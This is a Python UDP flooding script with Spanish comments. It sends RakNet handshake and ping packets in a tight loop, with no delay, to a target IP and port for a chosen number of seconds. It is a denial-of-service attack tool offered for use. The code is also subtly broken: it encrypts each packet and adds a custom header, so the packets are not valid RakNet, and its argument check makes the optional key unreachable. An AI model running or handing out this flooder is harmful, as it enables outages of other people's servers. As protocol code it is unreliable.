import socket
import struct
import time
import sys
import random
from cryptography.fernet import Fernet

# Constantes de RakNet
RAKNET_MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
CLIENT_GUID = 0x123456789ABCDEF0
CUSTOM_HEADER = b'\xDE\xAD\xBE\xEF'  # Encabezado personalizado

# Clave por defecto
DEFAULT_KEY = b'1234567890abcdef1234567890abcdef12345678'

def generate_random_key():
    return Fernet.generate_key()

def encrypt_message(message, key):
    f = Fernet(key)
    return f.encrypt(message)

def build_unconnected_ping(key):
    timestamp = int(time.time() * 1000)
    data = struct.pack('>BQ', 0x01, timestamp) + RAKNET_MAGIC + struct.pack('>Q', CLIENT_GUID)
    return CUSTOM_HEADER + encrypt_message(data, key)

def build_open_connection_request_1(key):
    protocol_version = 10
    mtu_size = 1492
    data = struct.pack('>BB', 0x05, protocol_version) + RAKNET_MAGIC + struct.pack('>H', mtu_size)
    return CUSTOM_HEADER + encrypt_message(data, key)

def build_open_connection_request_2(ip, port, key):
    mtu_size = 1492
    ip_bytes = b''.join([bytes([int(x)]) for x in ip.split('.')])
    server_addr = b'\x04' + ip_bytes + struct.pack('>H', port)
    data = struct.pack('>B', 0x07) + RAKNET_MAGIC + server_addr + struct.pack('>H', mtu_size) + struct.pack('>Q', CLIENT_GUID)
    return CUSTOM_HEADER + encrypt_message(data, key)

def build_connection_request(key):
    timestamp = int(time.time() * 1000)
    data = struct.pack('>BQ', 0x09, timestamp) + struct.pack('>Q', CLIENT_GUID)
    return CUSTOM_HEADER + encrypt_message(data, key)

def build_connected_ping(key):
    timestamp = int(time.time() * 1000)
    data = struct.pack('>BQ', 0x00, timestamp)
    return CUSTOM_HEADER + encrypt_message(data, key)

def raknet_flood(ip, port, duration, keys):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packets = [
        build_unconnected_ping(keys[0]),
        build_open_connection_request_1(keys[1]),
        build_open_connection_request_2(ip, port, keys[2]),
        build_connection_request(keys[3]),
        build_connected_ping(keys[4])
    ]
    sent = 0
    try:
        while time.time() < end_time:
            for packet in packets:
                try:
                    sock.sendto(packet, (ip, port))
                    sent += 1
                except Exception:
                    pass
            # Sin sleep para máxima velocidad (ajusta si tu CPU se sobrecarga)
    finally:
        sock.close()
        print(f"Paquetes enviados: {sent}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Uso: python {sys.argv[0]} <ip> <puerto> <tiempo_segundos> [clave]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    key = sys.argv[4].encode() if len(sys.argv) == 5 else DEFAULT_KEY

    # Generar múltiples claves aleatorias
    random_keys = [generate_random_key() for _ in range(5)]

    # Usar la clave proporcionada o la clave por defecto
    if len(sys.argv) == 5 and len(key) == 32:
        random_keys[0] = key

    raknet_flood(ip, port, duration, random_keys)
